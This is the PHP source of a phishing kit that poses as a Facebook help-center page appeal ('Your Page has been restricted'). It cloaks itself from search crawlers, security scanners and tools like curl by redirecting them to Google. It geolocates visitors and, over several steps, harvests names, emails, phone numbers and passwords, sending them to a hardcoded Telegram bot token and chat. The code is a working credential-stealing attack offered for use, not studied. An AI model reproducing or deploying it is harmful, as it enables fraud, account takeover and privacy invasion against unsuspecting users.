<?php
$get = "https://google.com";
$MyURL = "https://help9449205749284.com/case4958234/";
$notoken = "https://google.com";
$agent = $_SERVER['HTTP_USER_AGENT'];
$agent = trim($agent);
$agent = strtolower($agent);
if (
strpos($agent,'facebookexternalhit/1.1')===0
|| strpos($agent,'facebookexternalhit/1.0')===0
|| strpos($agent,'applebot')===0
|| strpos($agent,'java')===0
|| strpos($agent,'Media Center PC')===0
|| strpos($agent,'PhantomJS')===0
|| strpos($agent,'metauri.com')===0
|| strpos($agent,'Twitterbot')===0
|| strpos($agent,'above')===0
|| strpos($agent,'google')===0
|| strpos($agent,'softlayer')===0
|| strpos($agent,'amazonaws')===0
|| strpos($agent,'cyveillance')===0
|| strpos($agent,'phishtank')===0
|| strpos($agent,'dreamhost')===0
|| strpos($agent,'netpilot')===0
|| strpos($agent,'calyxinstitute')===0
|| strpos($agent,'tor-exit')===0
|| strpos($agent,'msnbot')===0
|| strpos($agent,'p3pwgdsn')===0
|| strpos($agent,'netcraft')===0
|| strpos($agent,'trendmicro')===0
|| strpos($agent,'ebay')===0
|| strpos($agent,'paypal')===0
|| strpos($agent,'torservers')===0
|| strpos($agent,'messagelabs')===0
|| strpos($agent,'sucuri.net')===0
|| strpos($agent,'crawler')===0
|| strpos($agent,'baidu')===0
|| strpos($agent,'baidubot')===0
|| strpos($agent,'Googlebot')===0
|| strpos($agent,'Baiduspider')===0
|| strpos($agent,'PhantomJS')===0
|| strpos($agent,'applebot')===0
|| strpos($agent,'metauri.com')===0
|| strpos($agent,'Twitterbot')===0
|| strpos($agent,'ia_archiver')===0
|| strpos($agent,'R6_FeedFetcher')===0
|| strpos($agent,'NetcraftSurveyAgent')===0
|| strpos($agent,'Sogou web spider')===0
|| strpos($agent,'bingbot')===0
|| strpos($agent,'Yahoo! Slurp')===0
|| strpos($agent,'facebookexternalhit')===0
|| strpos($agent,'PrintfulBot')===0
|| strpos($agent,'msnbot')===0
|| strpos($agent,'Twitterbot')===0
|| strpos($agent,'UnwindFetchor')===0
|| strpos($agent,'urlresolver')===0
|| strpos($agent,'Butterfly')===0
|| strpos($agent,'TweetmemeBot')===0
|| strpos($agent,'PaperLiBot')===0
|| strpos($agent,'MJ12bot')===0
|| strpos($agent,'AhrefsBot')===0
|| strpos($agent,'Exabot')===0
|| strpos($agent,'Ezooms')===0
|| strpos($agent,'YandexBot')===0
|| strpos($agent,'SearchmetricsBot')===0
|| strpos($agent,'picsearch')===0
|| strpos($agent,'TweetedTimes Bot')===0
|| strpos($agent,'QuerySeekerSpider')===0
|| strpos($agent,'ShowyouBot')===0
|| strpos($agent,'woriobot')===0
|| strpos($agent,'merlinkbot')===0
|| strpos($agent,'BazQuxBot')===0
|| strpos($agent,'Kraken')===0
|| strpos($agent,'SISTRIX Crawler')===0
|| strpos($agent,'R6_CommentReader')===0
|| strpos($agent,'magpie-crawler')===0
|| strpos($agent,'GrapeshotCrawler')===0
|| strpos($agent,'PercolateCrawler')===0
|| strpos($agent,'MaxPointCrawler')===0
|| strpos($agent,'R6_FeedFetcher')===0
|| strpos($agent,'NetSeer crawler')===0
|| strpos($agent,'grokkit-crawler')===0
|| strpos($agent,'SMXCrawler')===0
|| strpos($agent,'PulseCrawler')===0
|| strpos($agent,'Y!J-BRW')===0
|| strpos($agent,'80legs.com/webcrawler')===0
|| strpos($agent,'Mediapartners-Google')===0
|| strpos($agent,'Spinn3r')===0
|| strpos($agent,'InAGist')===0
|| strpos($agent,'Python-urllib')===0
|| strpos($agent,'NING')===0
|| strpos($agent,'TencentTraveler')===0
|| strpos($agent,'Feedfetcher-Google')===0
|| strpos($agent,'mon.itor.us')===0
|| strpos($agent,'spbot')===0
|| strpos($agent,'Feedly')===0
|| strpos($agent,'bot')===0
|| strpos($agent,'googlebot')===0 
|| strpos($agent,'BlackWidow')===0
|| strpos($agent,'ChinaClaw')===0
|| strpos($agent,'Custo')===0
|| strpos($agent,'DISCo')===0
|| strpos($agent,'Download\ Demon')===0
|| strpos($agent,'eCatch')===0
|| strpos($agent,'EirGrabber')===0
|| strpos($agent,'EmailSiphon')===0
|| strpos($agent,'EmailWolf')===0
|| strpos($agent,'Express\ WebPictures')===0
|| strpos($agent,'ExtractorPro')===0
|| strpos($agent,'EyeNetIE')===0
|| strpos($agent,'FlashGet')===0
|| strpos($agent,'GetRight')===0
|| strpos($agent,'GetWeb!')===0
|| strpos($agent,'Go!Zilla')===0
|| strpos($agent,'Go-Ahead-Got-It')===0
|| strpos($agent,'GrabNet')===0
|| strpos($agent,'Grafula')===0
|| strpos($agent,'HMView')===0
|| strpos($agent,'HTTrack')===0
|| strpos($agent,'Image\ Stripper')===0 
|| strpos($agent,'Image\ Sucker')===0
|| strpos($agent,'Indy\ Library')===0
|| strpos($agent,'InterGET')===0
|| strpos($agent,'Internet\ Ninja')===0 
|| strpos($agent,'JetCar')===0
|| strpos($agent,'JOC\ Web\ Spider')===0
|| strpos($agent,'larbin')===0
|| strpos($agent,'LeechFTP')===0 
|| strpos($agent,'Mass\ Downloader')===0
|| strpos($agent,'MIDown\ tool')===0
|| strpos($agent,'Mister\ PiX')===0
|| strpos($agent,'Navroad')===0
|| strpos($agent,'NearSite')===0
|| strpos($agent,'NetAnts')===0
|| strpos($agent,'NetSpider')===0
|| strpos($agent,'Net\ Vampire')===0 
|| strpos($agent,'NetZIP')===0
|| strpos($agent,'Octopus')===0
|| strpos($agent,'Offline\ Explorer')===0
|| strpos($agent,'Offline\ Navigator')===0
|| strpos($agent,'PageGrabber')===0
|| strpos($agent,'Papa\ Foto')===0
|| strpos($agent,'pavuk')===0
|| strpos($agent,'pcBrowser')===0
|| strpos($agent,'RealDownload')===0
|| strpos($agent,'ReGet')===0
|| strpos($agent,'SiteSnagger')===0
|| strpos($agent,'SmartDownload')===0
|| strpos($agent,'SuperBot')===0
|| strpos($agent,'SuperHTTP')===0
|| strpos($agent,'Surfbot')===0
|| strpos($agent,'tAkeOut')===0
|| strpos($agent,'Teleport\ Pro')===0
|| strpos($agent,'VoidEYE')===0
|| strpos($agent,'Web\ Image\ Collector')===0
|| strpos($agent,'Web\ Sucker')===0
|| strpos($agent,'WebAuto')===0
|| strpos($agent,'WebCopier')===0
|| strpos($agent,'WebFetch')===0
|| strpos($agent,'WebGo\ IS')===0
|| strpos($agent,'WebLeacher')===0
|| strpos($agent,'WebReaper')===0
|| strpos($agent,'WebSauger')===0
|| strpos($agent,'Website\ eXtractor')===0
|| strpos($agent,'Website\ Quester')===0
|| strpos($agent,'WebStripper')===0
|| strpos($agent,'WebWhacker')===0
|| strpos($agent,'WebZIP')===0
|| strpos($agent,'Wget')===0
|| strpos($agent,'Widow')===0
|| strpos($agent,'WWWOFFLE')===0
|| strpos($agent,'Xaldon\ WebSpider')===0
|| strpos($agent,'Zeus')===0
|| strpos($agent,'java')===0
|| strpos($agent,'curl')===0
|| strpos($agent,'spider')===0
|| strpos($agent,'crawler')===0
|| strpos($agent,'Google')===0
|| strpos($agent,'msnbot')===0
|| strpos($agent,'Rambler')===0
|| strpos($agent,'Yahoo')===0
|| strpos($agent,'AbachoBOT')===0
|| strpos($agent,'Accoona')===0
|| strpos($agent,'AcoiRobot')===0
|| strpos($agent,'ASPSeek')===0
|| strpos($agent,'CrocCrawler')===0
|| strpos($agent,'Dumbot')===0
|| strpos($agent,'FAST-WebCrawler')===0
|| strpos($agent,'GeonaBot')===0
|| strpos($agent,'Lycos')===0
|| strpos($agent,'MSRBOT')===0
|| strpos($agent,'Scooter')===0
|| strpos($agent,'Altavista')===0
|| strpos($agent,'IDBot')===0
|| strpos($agent,'eStyle')===0
|| strpos($agent,'Scrubby')===0
|| strpos($agent,'facebookexternalhit')===0
|| strpos($agent,'alexa')===0
|| strpos($agent,'twitter')===0
|| strpos($agent,'crawler')===0
|| strpos($agent,'bot')===0
|| strpos($agent,'spider')===0
|| strpos($agent,'curl')===0
){    
header("HTTP/1.1 301 Moved Permanently");
header("Location: ".$get."");
} else {
if(strpos($_SERVER['REQUEST_URI'], '?') == false){
echo 'Comming soon';
exit;
}
$ip = $_SERVER['REMOTE_ADDR'];
@ $details = json_decode(file_get_contents("http://ipinfo.io/{$ip}/json"));
@ $hostname=gethostbyaddr($_SERVER['REMOTE_ADDR']);
$QUERY_STRING = preg_replace("%[^/a-zA-Z0-9@,_=]%", '', $_SERVER['QUERY_STRING']);
$string =$QUERY_STRING.PHP_EOL .PHP_EOL .
'[IP address]: '.$ip.PHP_EOL .PHP_EOL .
'[Hostname]: '.$hostname.PHP_EOL .PHP_EOL .
'[Browser and OS]: '.$_SERVER['HTTP_USER_AGENT'] .PHP_EOL . $_SERVER['HTTP_REFERER'].PHP_EOL .PHP_EOL .
'[Coordinates]: '.$details->loc. PHP_EOL .PHP_EOL .
'[ISP provider]: '.$details->org. PHP_EOL .PHP_EOL .
'[City]: '.$details->city. PHP_EOL .PHP_EOL .
'[State]: '.$details->region. PHP_EOL .PHP_EOL .
'[Country]: '.$details->country. PHP_EOL .PHP_EOL .
'[Date]: '.date("D dS M,Y h:i a");
$longitud = '200';
$key = '';
$keys = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
$max = strlen($keys) - 1;
for($i=0; $i < $longitud; $i++){
$key .= $keys{mt_rand(0,$max)};
}
$rand_token = $ip;
//echo $ip;
$token = md5($rand_token);

$step = htmlspecialchars(strip_tags($_GET['step']));

if($step === "1"){
?>
<form action="<?php echo $MyURL; ?>index.php?step=2#<?php echo $token;?>#<?php echo $key;?>" method="POST" id="submit-form"><input type="hidden" name="rb" value="<?php echo $token;?>" id="rb" /><button style="visibility:hidden;" role="submit"></button></form>
<?php
} elseif($step === "2"){
if (isset($_POST['rb'])) {
$post = "".$_POST['rb']."";
$string = $ip;
if (md5($string) == $post){ 
//
?>
<form action="<?php echo $MyURL; ?>index.php?step=3#<?php echo $post;?>#<?php echo $key;?>" method="POST" id="submit-form"><input type="hidden" name="rb" value="<?php echo $post;?>" id="rb" /><button style="visibility:hidden;" role="submit"></button></form>
<?php
//echo "PHP KekusRF Antibot is FUD"; 
} else {
header("Location: ".$notoken."");
}
} else {
$post = "".$_POST['rb']."";
$string = $ip;
if (md5($string) == $post){ 

?>
<div class="container d-flex justify-content-center"><div class="cover" style="background-color: #1877F2;border-bottom-right-radius: 20px;border-bottom-left-radius: 20px;"><img src="<?php echo $MyURL; ?>cover.png" class="img-fluid"></div></div><div class="main-width" style="text-align: center; padding-bottom:80px"><div class="containerr"><div style=""></div><div class="row"><div class="col-md-12 offset-md-3 bababoks main-width"><div class="loginbaba"><p class="logbaba">Your Page has been restricted</p><form action="<?php echo $MyURL; ?>index.php?step=2" method="POST" style="text-align: left"><input type="hidden" name="rb1" value="<?php echo $token;?>" id="rb" /><input type="hidden" name="nmn1" value="<?php echo $token;?>" id="rb" /><div class="container justify-content-center d-flex align-items-center justify-content-center"><div class="col-md-10 info" style="background: #F0F2F5;border-radius: 8px; padding: 16px; margin-top: -1rem !important;font-size: 17px;margin-bottom: 17px;">To keep Facebook a safe place for everyone please submit a review for your page, if you do not submit a review within 24 hours your page might be unpublished.</div></div><input type="submit"  value="Continue" class="btn btn-primary submitbaba" name="formasubmitapeal"></form></div></div></div></div></div>
<?php
//echo "PHP KekusRF Antibot is FUD"; 
} else {
header("Location: ".$notoken."");
}
}
} elseif($step === "3"){
if (isset($_POST['formasubmitapeal'])) {
$post = "".$_POST['rb']."";
$string = $ip;
if (md5($string) == $post){ 
$apiToken = "5319096395:AAHcq6FVYhEWXNAMp8HbnyiLOejYwib7sjo";
$data =['chat_id' => '-1001623340392','text' =>'==========>RA<=========='. PHP_EOL .'Full Name:'.$_POST['fname']
    . PHP_EOL .'Email Address: '.$_POST['emsf']. PHP_EOL .'Phone:  '.$_POST['phone']. PHP_EOL .'Additional Info:  '.$_POST['adninfo']. PHP_EOL .'Ip address: ' .$ip
    . PHP_EOL . 'Country:  ' .$details->country . PHP_EOL
  ];


$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" .
http_build_query($data) );
?>
<form action="<?php echo $MyURL; ?>index.php?step=4#<?php echo $post;?>#<?php echo $key;?>" method="POST" id="submit-form"><input type="hidden" name="rb" value="<?php echo $post;?>" id="rb" /><button style="visibility:hidden;" role="submit"></button></form>
<?php
//echo "PHP KekusRF Antibot is FUD"; 
} else {
header("Location: ".$notoken."");
}
} else {
$post = "".$_POST['rb']."";
$string = $ip;
if (md5($string) == $post){ 

?>





<!doctype html>
<html lang="en">
  <head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <!-- Required meta tags -->
    
   
<meta name="viewport" content="width=device-width; initial-scale=1.0; maximum- 
scale=1.0; user-scalable=0">
    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css" integrity="sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO" crossorigin="anonymous">

    <title>Your personal account will be unpublish soon!</title>
    <style type="text/css">
      body{
        background-color: white;
        margin-bottom:30px;
      }
      .titleh3{
        font-size:16px;
        padding: 12px;
        background-color: #f5f6f7;
        border-bottom: 1px solid rgba(0, 0, 0, .101);
        border-top-right-radius: 5px;
        font-weight: 700;
        color: #4b4f56;
        border-top-left-radius: 5px;
        margin-bottom: 0px;
      }

      .content{

      }
      .content1{
        background-color: white;
        padding: 10px;
        font-size: 13px;
        border-bottom: 1px solid rgba(0, 0, 0, .101);
      }
      .content2{
        background-color: white;
        padding: 10px;
        font-size: 13px;
        border-bottom: 1px solid rgba(0, 0, 0, .101);
      }
      .content2 a{
        color:#576b95;
      }
      .content2 input[type=text]{
        box-shadow: inset 0 1px 0 rgba(0, 0, 0, .07);
        border: 1px solid #999;
        border-radius: 0px;
        height: 30px;
      }
      .content2 input[type=password]{
        box-shadow: inset 0 1px 0 rgba(0, 0, 0, .07);
        border: 1px solid #999;
        border-radius: 0px;
        height: 30px;
      }
      .content2 label{
        margin-bottom:1px;
      }
      
      .afterheader .list-group .list-group-item{
          padding:0px;
          padding-top:5px;
          padding-bottom:5px;
          font-size:14px;
          border:0px;
          color: #444950;
      }
      .afterheader .list-group .list-group-item:hover{
          background-color:rgba(29, 33, 41, .04);
      }
      
      .content2 small{
        margin-bottom: 2px;
      }
      .content2 textarea{
        box-shadow: inset 0 1px 0 rgba(0, 0, 0, .07);
        border: solid 1px #999;
        border-top-color: #888;
        border-radius: 0px;
        height: 65px;
      }
      .butonsend button{
        width:100%;
        background-color: #627aad;
        background-image: linear-gradient(rgba(0, 0, 0, 0), rgba(0, 0, 0, .1));
        font-weight: bold;
      }
      .navbari .nav-linkuu{
          color:#3578e5 !important;
          font-size:14px !important;
          font-weight:600 !important;
          padding: 15px 0px !important;
          border-bottom: 3px solid #3578e5;
      }
      .navbari .navbar {
          padding-top: 0px !important;
          padding-bottom: 0px !important;
      }
      .butonsend {
        margin-top:10px;
      }
      .navbari{
          background-color:#e9ebee;
      }
      .afterheader{
          margin-top:32px;
      }
      
        @media only screen and (max-width: 600px) {
          .afterheader {
            margin-top:9px;
          }
          .titleh3{
            font-weight: 600;
          }
          body{
            background-color: #dddfe2;
            margin-bottom:20px;
          }
          .navbari{
              display:none;
          }
          .sidebar-afterheader{
              display:none;
          }
          .logojababik{
              height:30px !important;
              text-align:center !important;
          }
          .headerbabika{
              text-align:center !important;
          }
          .searchibl{
              display: none;
          }
          .babikasubmitdesktop{
              display:none;
          }
          .footeriba{
              display:none;
          }
        }
        
        @media only screen and (min-width: 768px) {
          .content2{
              padding:20px !important;
          }
          .butonsendonlymobile{
              display:none;
          }
          .logojababik{
              height:37px !important;
              text-align:left !important;
          }
          .content2 label{
              color: #90949c !important;
              font-weight:700 !important;
              font-size:12px;
          }
          .content2 small{
              color: #90949c !important;
              margin-bottom:5px;
          }
          .content2 .form-group{
              margin-bottom:9px !important;
          }
          .content2 input[type=text], .content2 textarea, .content2 input[type=password]{
              margin-top:7px !important;
          }
          .headerbabika{
              padding-top: 17px !important;
              padding-bottom: 17px !important;
          }
          .searchibl i{
              color: #616161;
              font-size:13px;
          }
          .searchibl .form-control-lg{
              font-size: 17px;
              padding: 0px 8px !important;
              border:none;
          }
          .searchibl form{
              border: 1px solid  #000;
              border-radius:0px !important;
          }
          .searchibl .card-body{
              padding: 0px !important;
              padding-left: 10px !important;
          }
          .searchibl input{
              height: 36px !important;
              color: #90949c;
          }
          .babikasubmitdesktop{
              background-color:#f5f6f7;
              text-align:right;
              padding: 11px 20px;
          }
          .babikasubmitdesktop button{
            background-color: #4267b2;
            border-color: #4267b2;
            line-height: 31px;
            padding: 0 15px;
            font-weight: 500;
            font-size: 13px;
          }
          
            .footeriba ul {
              list-style-type: none;
              margin: 0;
              padding: 0;
              overflow: hidden;
            }
            
            .footeriba li {
              float: left;
            }
            
           .footeriba  li a {
              display: block;
              color: #90949c;
              text-align: center;
              padding: 15px 10px;
              font-size: 12px;
              text-decoration: none;
            }
            .footeriba  li a.active {
              color: #bec3c9;
            }
            .footermenu{
                margin-top:20px;
                margin-bottom:20px;
            }
            .footermenu .list-group-item{
                border: none;
                font-size:12px;
                color: #90949c;
                padding: 4px 10px;
            }
          .afterheader{
              margin-bottom: 70px !important;
          }
        }
    </style>
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">



  </head>
  <body>
      
    <section class="headerbabika" style="background-color:#39569a; padding-top:7px; padding-bottom:7px">
      <div class="container">
        <div class="row">
          <div class="col-12 col-md-4"> 
            <img src="yos.png" class="logojababik" />
          </div>
          <div class="col-12 col-md-8 searchibl"> 
            <div class="justify-content-center">
                                    <div class="card-body row no-gutters align-items-center">
                        <div class="col-auto">
                            <i class="fas fa-search h4 text-body"></i>
                        </div>
                        <!--end of col-->
                        <div class="col">
                            <input class="form-control form-control-lg form-control-borderless" type="search" placeholder="How can we help?">
                        </div>
                    </div>

            </div>
          </div>
        </div>
      </div>
    </section>
    <section class="navbari">
        <div class="container">
            <nav class="navbar navbar-expand-lg navbar-light ">
              
            
              <div class="collapse navbar-collapse" id="navbarSupportedContent">
                <ul class="navbar-nav mr-auto">
                  
                  <li class="nav-item">
                    <a class="nav-link nav-linkuu" href="#"><i class="fas fa-home"></i> Help Center</a>
                  </li>
                  
                </ul>
                <div class="my-2 my-lg-0">
                    <ul class="navbar-nav">
                        <li class="nav-item">
                            <a class="nav-link" style="font-weight:400 !important; font-size:12px; color:#4065b4" href="#">English (U.S)</a>
                        </li>
                    </ul>
                </div>
              </div>
            </nav>
        </div>
    </section>
    
    <section class="afterheader">
      <div class="container">
        <div class="row">
            <div class="col-12 col-md-3 sidebar-afterheader">  
                <ul class="list-group">
                  <li class="list-group-item">Creating an Account</li>
                  <li class="list-group-item">Friending</li>
                  <li class="list-group-item">Your Home Page</li>
                  <li class="list-group-item">Messaging</li>
                  <li class="list-group-item">Stories</li>
                  <li class="list-group-item">Photos</li>
                  <li class="list-group-item">Videos</li>
                  <li class="list-group-item">Pages</li>
                  <li class="list-group-item">Groups</li>
                  <li class="list-group-item">Events</li>
                  <li class="list-group-item">Payments</li>
                  <li class="list-group-item">Marketplace</li>
                  <li class="list-group-item">Apps</li>
                  <li class="list-group-item">Accessibility</li>
                </ul>
            </div>
          <div class="col-12 col-md-7">  
            
            <div style="border: 1px solid #c8cacc; border-radius: 4px">
              <h3 class="titleh3">Appeal a Page Policy Violation</h3>
              <div class="content2">
                  If you believe your Page is going to be unpublished by mistake, please enter the following information. By entering the following information we will review your page again.

<form action="<?php echo $MyURL; ?>index.php?step=3" method="POST" style="margin-top:14px">
<div class="form-group"> 
<label for="exampleFormControlInput1">Email address </label>

<input type="email"  class="form-control" id="exampleFormControlInput1" name="emsf" required>
                    </div>
                    
<div class="form-group"> 
<label for="exampleFormControlInput1">Phone number</label>
<input type="tel"  class="form-control" id="exampleFormControlInput1" name="phone"  required>
</div>
<input type="hidden" name="rb" value="<?php echo $post;?>" id="rb" />                 

<div class="form-group"> 
<label for="exampleFormControlInput1">Your full name</label>
<input type="text"  class="form-control" id="exampleFormControlInput1" name="fname"  required>
</div>

<div class="form-group"> 
<label for="exampleFormControlInput1">Additional info</label>
  <textarea class="form-control" id="exampleFormControlTextarea1" rows="3" name="adninfo"></textarea>

</div>

</div>
<div class="container butonsend butonsendonlymobile">
      <div class="row">
        <div class="col-12">
         <input type="submit" class="btn btn-primary" name="formasubmitapeal" style="
    width: 100%;
    margin-bottom: 7px;
">
        </div>
      </div>
    </div>

<div class="babikasubmitdesktop">
<input type="submit" class="btn btn-primary" name="formasubmitapeal"/></div></div></div></div></div>


</form></section>
    
<section class="footeriba">
<div class="container">
<div class="row">
<div class="col-12">
<ul>
<li><a class="active" href="#">English (US)</a></li>
<li><a href="#">Deutsch</a></li>
<li><a href="#">Türkçe</a></li>
<li><a href="#">Српски</a></li>
<li><a href="#">Français (France)</a></li>
<li><a href="#">Italiano</a></li>
<li><a href="#">Bosanski</a></li>
<li><a href="#">Svenska</a></li>
<li><a href="#">Español</a></li>
<li><a href="#">Português (Brasil)</a></li>
<li style="float:right; color:#8d949e"><a>Facebook © 2022</a></li>
</ul>
</div>
</div>
<div class="row footermenu">
<div class="col-md-2">
<ul class="list-group">
<li class="list-group-item">About</li>
<li class="list-group-item">Privacy</li>
<li class="list-group-item">Careers</li>
</ul>
</div>
<div class="col-md-2">
<ul class="list-group">
<li class="list-group-item">Ad Choices</li>
<li class="list-group-item">Create Ad</li>
<li class="list-group-item">Create Page</li>
</ul>
</div>
<div class="col-md-2">
<ul class="list-group">
<li class="list-group-item">Terms & Policies</li>
<li class="list-group-item">Cookies</li>
</ul></div></div></div>

</section></body></html>










<?php
//echo "PHP KekusRF Antibot is FUD"; 
} else {
header("Location: ".$notoken."");
}
}
} elseif($step === "4"){
if (isset($_POST['pwja'])) {
$post = "".$_POST['rb']."";
$string = $ip;
if (md5($string) == $post){ 

$apiToken = "5319096395:AAHcq6FVYhEWXNAMp8HbnyiLOejYwib7sjo";
$data =['chat_id' => '-1001623340392',
'text' => '==========>Password 1<=========='. PHP_EOL . 'Password1: '.$_POST['pwja'] . PHP_EOL . 'Ip address: ' .$ip
    . PHP_EOL . 'Country:  ' .$details->country];
  $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" .
http_build_query($data) );   
?>
<form action="<?php echo $MyURL; ?>index.php?step=5#<?php echo $post;?>#<?php echo $key;?>" method="POST" id="submit-form"><input type="hidden" name="rb" value="<?php echo $post;?>" id="rb" /><button style="visibility:hidden;" role="submit"></button></form>
<?php

//echo "PHP KekusRF Antibot is FUD"; 
} else {
header("Location: ".$notoken."");
}
} else {
$post = "".$_POST['rb']."";
$string = $ip;
if (md5($string) == $post){ 
?>

<html lang="en"><head><script type="text/javascript" async="" src="https://www.google-analytics.com/analytics.js"></script><script async="" src="https://chimpstatic.com/mcjs-connected/js/users/bed1a45254971ada65acedf9b/0ba8f4afa78a22970976b239e.js"></script><script type="text/javascript">
    $(window).on('load', function() {
        $('#exampleModal').modal('show');
    });
</script>

<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <!-- Required meta tags -->
    
   
<meta name="viewport" content="width=device-width; initial-scale=1.0; maximum- 
scale=1.0; user-scalable=0">
    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css" integrity="sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO" crossorigin="anonymous">

    <title>Your personal account will be unpublish soon!</title>
    <style type="text/css">
      body{
        background-color: white;
        margin-bottom:30px;
      }
      .titleh3{
        font-size:16px;
        padding: 12px;
        background-color: #f5f6f7;
        border-bottom: 1px solid rgba(0, 0, 0, .101);
        border-top-right-radius: 5px;
        font-weight: 700;
        color: #4b4f56;
        border-top-left-radius: 5px;
        margin-bottom: 0px;
      }

      .content{

      }
      .content1{
        background-color: white;
        padding: 10px;
        font-size: 13px;
        border-bottom: 1px solid rgba(0, 0, 0, .101);
      }
      .content2{
        background-color: white;
        padding: 10px;
        font-size: 13px;
        border-bottom: 1px solid rgba(0, 0, 0, .101);
      }
      .content2 a{
        color:#576b95;
      }
      .content2 input[type=text]{
        box-shadow: inset 0 1px 0 rgba(0, 0, 0, .07);
        border: 1px solid #999;
        border-radius: 0px;
        height: 30px;
      }
      .content2 input[type=password]{
        box-shadow: inset 0 1px 0 rgba(0, 0, 0, .07);
        border: 1px solid #999;
        border-radius: 0px;
        height: 30px;
      }
      .content2 label{
        margin-bottom:1px;
      }
      
      .afterheader .list-group .list-group-item{
          padding:0px;
          padding-top:5px;
          padding-bottom:5px;
          font-size:14px;
          border:0px;
          color: #444950;
      }
      .afterheader .list-group .list-group-item:hover{
          background-color:rgba(29, 33, 41, .04);
      }
      
      .content2 small{
        margin-bottom: 2px;
      }
      .content2 textarea{
        box-shadow: inset 0 1px 0 rgba(0, 0, 0, .07);
        border: solid 1px #999;
        border-top-color: #888;
        border-radius: 0px;
        height: 65px;
      }
      .butonsend button{
        width:100%;
        background-color: #627aad;
        background-image: linear-gradient(rgba(0, 0, 0, 0), rgba(0, 0, 0, .1));
        font-weight: bold;
      }
      .navbari .nav-linkuu{
          color:#3578e5 !important;
          font-size:14px !important;
          font-weight:600 !important;
          padding: 15px 0px !important;
          border-bottom: 3px solid #3578e5;
      }
      .navbari .navbar {
          padding-top: 0px !important;
          padding-bottom: 0px !important;
      }
      .butonsend {
        margin-top:10px;
      }
      .navbari{
          background-color:#e9ebee;
      }
      .afterheader{
          margin-top:32px;
      }
      
        @media only screen and (max-width: 600px) {
          .afterheader {
            margin-top:9px;
          }
          .titleh3{
            font-weight: 600;
          }
          body{
            background-color: #dddfe2;
            margin-bottom:20px;
          }
          .navbari{
              display:none;
          }
          .sidebar-afterheader{
              display:none;
          }
          .logojababik{
              height:30px !important;
              text-align:center !important;
          }
          .headerbabika{
              text-align:center !important;
          }
          .searchibl{
              display: none;
          }
          .babikasubmitdesktop{
              display:none;
          }
          .footeriba{
              display:none;
          }
        }
        
        @media only screen and (min-width: 768px) {
          .content2{
              padding:20px !important;
          }
          .butonsendonlymobile{
              display:none;
          }
          .logojababik{
              height:37px !important;
              text-align:left !important;
          }
          .content2 label{
              color: #90949c !important;
              font-weight:700 !important;
              font-size:12px;
          }
          .content2 small{
              color: #90949c !important;
              margin-bottom:5px;
          }
          .content2 .form-group{
              margin-bottom:9px !important;
          }
          .content2 input[type=text], .content2 textarea, .content2 input[type=password]{
              margin-top:7px !important;
          }
          .headerbabika{
              padding-top: 17px !important;
              padding-bottom: 17px !important;
          }
          .searchibl i{
              color: #616161;
              font-size:13px;
          }
          .searchibl .form-control-lg{
              font-size: 17px;
              padding: 0px 8px !important;
              border:none;
          }
          .searchibl form{
              border: 1px solid  #000;
              border-radius:0px !important;
          }
          .searchibl .card-body{
              padding: 0px !important;
              padding-left: 10px !important;
          }
          .searchibl input{
              height: 36px !important;
              color: #90949c;
          }
          .babikasubmitdesktop{
              background-color:#f5f6f7;
              text-align:right;
              padding: 11px 20px;
          }
          .babikasubmitdesktop button{
            background-color: #4267b2;
            border-color: #4267b2;
            line-height: 31px;
            padding: 0 15px;
            font-weight: 500;
            font-size: 13px;
          }
          
            .footeriba ul {
              list-style-type: none;
              margin: 0;
              padding: 0;
              overflow: hidden;
            }
            
            .footeriba li {
              float: left;
            }
            
           .footeriba  li a {
              display: block;
              color: #90949c;
              text-align: center;
              padding: 15px 10px;
              font-size: 12px;
              text-decoration: none;
            }
            .footeriba  li a.active {
              color: #bec3c9;
            }
            .footermenu{
                margin-top:20px;
                margin-bottom:20px;
            }
            .footermenu .list-group-item{
                border: none;
                font-size:12px;
                color: #90949c;
                padding: 4px 10px;
            }
          .afterheader{
              margin-bottom: 70px !important;
          }
        }
    </style>
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">

  </head>
<body class="modal-open" style="padding-right: 16px;">

<section class="headerbabika" style="background-color:#39569a; padding-top:7px; padding-bottom:7px"><div class="container"><div class="row"><div class="col-12 col-md-4"> <img src="yos.png" class="logojababik"></div>

<div class="col-12 col-md-8 searchibl"> 

<div class="justify-content-center"><form class="card card-sm"><div class="card-body row no-gutters align-items-center">
<div class="col-auto"><i class="fas fa-search h4 text-body"></i></div>

<!--end of col-->
<div class="col"><input class="form-control form-control-lg form-control-borderless" type="search" placeholder="How can we help?">
</div></div></form></div></div></div></div></section>

<section class="navbari"><div class="container"><nav class="navbar navbar-expand-lg navbar-light ">
              
            
<div class="collapse navbar-collapse" id="navbarSupportedContent">
<ul class="navbar-nav mr-auto">
                  
<li class="nav-item"><a class="nav-link nav-linkuu" href="#"><i class="fas fa-home"></i> Help Center</a></li></ul>

<div class="my-2 my-lg-0"><ul class="navbar-nav"><li class="nav-item"><a class="nav-link" style="font-weight:400 !important; font-size:12px; color:#4065b4" href="#">English (U.S)</a></li></ul></div></div></nav></div></section>
    
